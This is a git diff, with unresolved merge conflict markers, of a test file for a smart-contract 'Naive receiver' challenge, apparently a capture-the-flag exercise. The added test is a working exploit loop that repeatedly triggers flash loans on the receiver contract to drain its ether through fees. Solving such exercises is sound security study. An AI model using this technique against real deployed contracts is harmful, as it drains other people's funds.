@@ -36,9 +36,16 @@ describe('[Challenge] Naive receiver', function () {
         ).to.eq(ETHER_IN_RECEIVER);
     });
 
+<<<<<<< Updated upstream
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
     });
+=======
+    it('Exploit', async function () {
+    while ((await ethers.provider.getBalance(this.receiver.address)).gte("1000000000000000000")) {
+       await this.pool.flashLoan(this.receiver.address, ETHER_IN_POOL);
+     }    });
+>>>>>>> Stashed changes
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
